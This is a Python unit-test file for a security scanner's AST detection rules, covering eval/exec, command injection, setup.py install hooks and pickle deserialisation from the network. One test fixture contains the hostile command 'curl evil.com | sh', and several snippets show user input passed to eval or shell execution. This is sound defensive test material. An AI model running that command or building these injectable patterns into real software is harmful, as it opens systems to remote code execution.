"""Unit tests for all YAML-defined AST detection rules (no LLM calls).

Rules are loaded from rules/definitions/*.yaml via all_rules().  Tests are
grouped by rule ID and structured as:
  - positive cases — the rule fires on code it should detect
  - negative cases — the rule does NOT fire on safe code (no false positives)
"""

import ast

import pytest

from pyhunter.rules.registry import all_rules


def _parse(src: str):
    return ast.parse(src), src.splitlines()


# Build a lookup once so each test class can reference rules by ID
_RULES = {r.rule_id: r for r in all_rules()}


# ── RCE-EVAL ──────────────────────────────────────────────────────────────────

class TestRCEEval:
    rule = _RULES["RCE-EVAL"]

    def test_detects_eval(self):
        tree, lines = _parse("eval(user_input)")
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1
        assert findings[0].sink == "eval"

    def test_detects_exec(self):
        tree, lines = _parse("exec(code)")
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1
        assert findings[0].sink == "exec"

    def test_detects_compile(self):
        tree, lines = _parse("compile(src, '<string>', 'exec')")
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1
        assert findings[0].sink == "compile"

    def test_safe_int_conversion_no_finding(self):
        tree, lines = _parse("x = int(user_input)")
        findings = self.rule.check(tree, lines, "test.py")
        assert findings == []


# ── CMD-INJECT ────────────────────────────────────────────────────────────────

class TestCmdInject:
    rule = _RULES["CMD-INJECT"]

    def test_detects_tainted_os_system(self):
        src = """\
import os
from flask import request
def view():
    cmd = request.args.get("host")
    os.system(cmd)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert any(f.sink == "os.system" for f in findings)

    def test_detects_tainted_subprocess_shell_true(self):
        src = """\
import subprocess
from flask import request
def run():
    cmd = request.form.get("cmd")
    subprocess.run(cmd, shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1

    def test_untainted_os_system_not_flagged(self):
        src = """\
import os
def backup():
    os.system("tar -czf /tmp/backup.tar.gz /app")
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert findings == []

    def test_subprocess_without_shell_not_flagged(self):
        src = """\
import subprocess
from flask import request
def run():
    path = request.args.get("file")
    subprocess.run(["ls", path], shell=False)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert findings == []


# ── RCE-IMPORT ───────────────────────────────────────────────────────────────

class TestRCEImport:
    rule = _RULES["RCE-IMPORT"]

    def test_detects_eval_in_init(self):
        tree, lines = _parse("eval(dangerous)")
        findings = self.rule.check(tree, lines, "__init__.py")
        assert len(findings) == 1
        assert findings[0].sink == "eval"

    def test_ignores_regular_files(self):
        tree, lines = _parse("eval(dangerous)")
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_detects_system_in_setup(self):
        tree, lines = _parse("import os\nos.system('curl evil.com | sh')")
        findings = self.rule.check(tree, lines, "setup.py")
        assert any(f.sink == "system" for f in findings)


# ── RCE-BUILD ─────────────────────────────────────────────────────────────────

class TestRCEBuild:
    rule = _RULES["RCE-BUILD"]

    def test_detects_cmdclass(self):
        src = "from setuptools import setup\nsetup(name='x', cmdclass={'install': MyInstall})"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "setup.py")
        assert len(findings) == 1
        assert "cmdclass" in findings[0].sink

    def test_ignores_non_setup_files(self):
        src = "setup(name='x', cmdclass={'install': MyInstall})"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "mymodule.py")
        assert findings == []

    def test_safe_setup_no_finding(self):
        src = "from setuptools import setup\nsetup(name='x', version='1.0')"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "setup.py")
        assert findings == []


# ── FLOW-WEB ──────────────────────────────────────────────────────────────────

class TestFlowWeb:
    rule = _RULES["FLOW-WEB"]

    def test_detects_request_args_to_eval(self):
        src = """\
from flask import request
def view():
    expr = request.args.get("q")
    return eval(expr)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any(f.sink == "eval" for f in findings)
        assert any("request.args" in (f.source or "") for f in findings)

    def test_detects_request_form_to_subprocess(self):
        src = """\
import subprocess
from flask import request
def upload():
    cmd = request.form["command"]
    subprocess.run(cmd, shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("subprocess" in f.sink for f in findings)

    def test_no_finding_when_no_tainted_source(self):
        src = """\
def safe():
    cmd = "ls /tmp"
    import subprocess
    subprocess.run(cmd, shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_taint_propagates_through_assignment(self):
        src = """\
from flask import request
def view():
    raw = request.args
    user_val = raw
    return eval(user_val)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any(f.sink == "eval" for f in findings)


# ── EXEC-DECORATOR ────────────────────────────────────────────────────────────

class TestExecDecorator:
    rule = _RULES["EXEC-DECORATOR"]

    def test_detects_eval_decorator(self):
        src = """\
@eval(user_expr)
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("eval" in f.sink for f in findings)

    def test_detects_run_decorator_with_dynamic_arg(self):
        src = """\
@run(user_input)
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("run" in f.sink for f in findings)

    def test_safe_route_literal_no_finding(self):
        src = """\
@app.route("/api/data")
def data():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_detects_dynamic_route(self):
        src = """\
@app.route(user_path)
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert len(findings) == 1
        assert "route" in findings[0].sink

    def test_bare_eval_decorator(self):
        src = """\
@eval
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("eval" in f.sink for f in findings)


# ── PICKLE-NET ────────────────────────────────────────────────────────────────

class TestPickleNet:
    rule = _RULES["PICKLE-NET"]

    def test_detects_pickle_loads_from_recv(self):
        src = """\
import pickle, socket
def serve():
    s = socket.socket()
    data = s.recv(4096)
    pickle.loads(data)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "server.py")
        assert any(f.sink == "pickle.loads" for f in findings)

    def test_detects_pickle_loads_from_response_content(self):
        src = """\
import pickle, requests
def fetch():
    resp = requests.get("http://internal/data")
    return pickle.loads(resp.content)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "client.py")
        assert len(findings) >= 1
        assert all(f.sink == "pickle.loads" for f in findings)

    def test_safe_pickle_from_local_file(self):
        src = """\
import pickle
def load_model():
    with open("model.pkl", "rb") as f:
        return pickle.load(f)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []
